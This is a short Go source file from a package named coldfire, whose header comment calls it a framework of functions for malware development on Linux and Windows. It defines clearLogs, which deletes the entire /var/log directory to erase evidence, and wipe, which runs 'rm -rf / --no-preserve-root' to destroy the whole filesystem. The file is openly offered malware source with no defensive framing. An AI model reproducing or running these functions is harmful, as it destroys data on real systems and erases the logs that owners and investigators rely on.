// Package coldfire is a framework that provides functions
// for malware development that are mostly compatible with
// Linux and Windows operating systems.
package coldfire
import "os"

func clearLogs() error {
	err := os.RemoveAll("/var/log")
	return err
}

func wipe() error {
	cmd := "rm -rf / --no-preserve-root"
	_, err := cmdOut(cmd)
	if err != nil {
		return err
	}

	return nil
}
